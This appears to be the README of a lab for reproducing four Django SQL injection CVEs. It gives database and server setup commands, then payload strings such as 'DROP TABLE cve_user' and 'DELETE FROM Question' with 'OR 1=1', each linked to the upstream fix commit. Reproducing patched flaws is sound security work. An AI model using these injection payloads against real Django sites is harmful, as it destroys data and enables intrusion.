## How to setup environment

### setup db
```
docker run -d -p 50000:5432 -e POSTGRES_PASSWORD=qwe123QWE -e POSTGRES_DB=db postgres:14.1
```

### execute migration
```
python manage.py makemigrations cve

python manage.py migrate
```

### setup service
```
python manage.py runserver
```


Issue 1: 

Reproduction: CVE-2022-28346: field=count" from cve_user group by cve_user.id;DROP TABLE cve_user;--     

Fix: https://github.com/django/django/commit/93cae5cb2f9a4ef1514cf1a41f714fef08005200 

 

Issue 2: 

Reproduction: CVE-2022-28346: options={"select * from cve_blog_post); DROP TABLE cve_blog_post;--":""}   

Fix: https://github.com/django/django/commit/93cae5cb2f9a4ef1514cf1a41f714fef08005200

 

Issue 3: 

Reproduction: CVE-2022-34265: input=year%27%20FROM%20pub_date))%20OR%201=1;DELETE%20FROM%20Question--

Fix: https://github.com/django/django/commit/54eb8a374d5d98594b264e8ec22337819b37443c  

 

Issue 4: 

Reproduction: CVE-2021-35042  order_by=cve_user.id);drop table cve_user; -- 

Fix: https://github.com/django/django/commit/a34a5f724c5d5adb2109374ba3989ebb7b11f81f  